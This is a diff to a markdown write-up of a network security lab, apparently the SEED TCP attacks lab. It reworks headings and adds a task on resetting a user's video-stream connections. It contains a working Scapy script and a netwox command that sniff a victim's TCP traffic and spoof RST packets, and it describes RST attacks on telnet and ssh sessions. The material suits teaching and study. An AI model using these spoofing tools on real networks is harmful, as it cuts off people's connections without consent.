@@ -108,7 +108,7 @@ Meanwhile, if you attempt to `telnet` the server machine from the user machine, 
 
 ![SYN flooding attack is indeed sucessful](./flood.png)
 
-## Task 2
+# Task 2
 
 ### TCP RST attack on `telnet` connection
 
@@ -120,7 +120,7 @@ telnet 10.0.2.4
 
 A prompt asks you to give a username.**Just hold on** without typing anything.
 
-#### netwox
+### netwox
 
 When implementing the attack by `netwox` command, simply use such a command on the attacker machine:
 
@@ -132,7 +132,7 @@ Then type any letter on the user machine. As I explained in [Packet Sniffing and
 
 ![](./telnet_rst_1.png)
 
-#### Scapy
+### Scapy
 
 **Note**: The login-in time window is too short. you should launch the attack as quickly as possible, or the login in prompt will be timed out after 60s. Therefore, in this task, you can finish the login-in process to observe the attack.
 
@@ -184,7 +184,7 @@ Immediately, on the user machine, you can find the connection is terminated.
 
 ![](./telnet_rst_2.png)
 
-### TCP RST attack on `ssh` connection
+## TCP RST attack on `ssh` connection
 
 The only difference between the two tasks is the port number: 23 for `telnet`, while 22 for `ssh`.
 
@@ -196,7 +196,7 @@ ssh seed@10.0.2.4
 > **Note**: If it is the first time you `ssh` the server on your local machine, it may ask you if the RSA public key can be added. Please type '`yes`' and then type the password of username `seed`.
 
 
-#### netwox
+### netwox
 
 Similar to [the one on `telnet`](#tcp-rst-attack-on-ssh-connection), Use the same commnad:
 
@@ -208,7 +208,7 @@ Then on the user machine after pressing anything you will get:
 
 ![](./ssh_rst_1.png)
 
-#### scapy
+### scapy
 
 Similar to [the one on `telnet`](#tcp-rst-attack-on-ssh-connection), Capture the last `ssh` packet from the server to the user (applied with filter `ssh`) using Wireshark on the attacker machine:
 
@@ -246,3 +246,40 @@ send(pkt, verbose=0)
 Turn to the user machine, the `ssh` connection is broken as expected:
 
 ![](./ssh_rst_2.png)
+
+# Task 3
+
+Assume that a user is watching YouTube video from the VM `10.0.2.4` (For better performance, you might clear up local history, data, and cookies of the browser on the user machine). We launch the attack from the attacker machine in the same subnet.
+
+## Scapy
+
+We can run a [`auto_rst`](./auto_rst.py) program to spoof an RST packet with proper `seq` and `ack` numbers whenever capturing a TCP packet from the user IP.
+
+```python
+#!/usr/bin/python3
+from scapy.all import *
+
+def spoof_tcp(pkt):
+   ip  = IP(dst="10.0.2.5", src=pkt['IP'].dst)
+   tcp = TCP(flags="R", seq=pkt['TCP'].ack,
+                  dport=pkt['TCP'].sport, sport=pkt['TCP'].dport)
+   spoofpkt = ip / tcp
+   print("send a RST oacket")
+   send(spoofpkt, verbose=0)
+
+pkt=sniff(filter='tcp and src host 10.0.2.5', prn=spoof_tcp)
+```
+
+Eventually, no video stream data can be gained from the server. The user cannot see any new video content.
+
+![](./ytb_rst_1.png)
+
+## Netwox
+
+Or simply use `netwox` tool 78 to automatically reset the TCP connection.
+
+```
+sudo netwox 78 --filter "src host 10.0.2.5"
+```
+
+![](./ytb_rst_2.png)
